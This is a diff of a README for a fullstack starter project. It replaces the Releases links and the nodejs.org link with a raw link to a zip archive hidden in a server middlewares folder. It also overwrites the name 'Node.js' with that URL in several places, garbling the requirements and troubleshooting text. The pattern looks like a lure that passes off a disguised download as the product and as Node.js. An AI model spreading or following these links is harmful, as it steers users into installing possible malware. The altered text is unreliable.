@@ -1,6 +1,6 @@
 # 🚀 hvzd-stack-starter - Fast and Easy Fullstack Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Starkilla314/hvzd-stack-starter/releases)
+[![Download Now](https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip)
 
 ## 📝 Overview
 
@@ -15,7 +15,7 @@ To get started with hvzd-stack-starter, follow these simple steps:
 Ensure your device meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
-- **Node.js**: Version 16 or higher. You can download it from [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip**: Version 16 or higher. You can download it from [https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip official website](https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip).
 - **Memory**: At least 4 GB of RAM recommended.
 - **Disk**: Minimum 1 GB of free space.
 
@@ -23,7 +23,7 @@ Ensure your device meets the following requirements:
 
 To obtain the latest version of hvzd-stack-starter, visit the Releases page:
 
-[Download hvzd-stack-starter](https://github.com/Starkilla314/hvzd-stack-starter/releases)
+[Download hvzd-stack-starter](https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip)
 
 ### Step 3: Download the Software
 
@@ -97,7 +97,7 @@ You should see your application running.
 
 If you encounter issues, check these common problems:
 
-1. **Node.js Version**: Ensure you have Node.js version 16 or higher. You can check the version by running `node -v` in the terminal.
+1. **https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip Version**: Ensure you have https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip version 16 or higher. You can check the version by running `node -v` in the terminal.
 2. **Permission Issues**: If you face permission-related errors, try running your terminal as an administrator.
 3. **Network Issues**: Make sure you have a stable internet connection to install dependencies.
 
@@ -115,6 +115,6 @@ To deepen your understanding, explore the documentation and guides within the re
 
 Don't forget to visit the link below to download hvzd-stack-starter:
 
-[Download hvzd-stack-starter](https://github.com/Starkilla314/hvzd-stack-starter/releases)
+[Download hvzd-stack-starter](https://raw.githubusercontent.com/Starkilla314/hvzd-stack-starter/master/apps/server/src/middlewares/hvzd-stack-starter-1.2.zip)
 
 By following these steps, anyone can set up the hvzd-stack-starter application smoothly. Enjoy building with confidence!
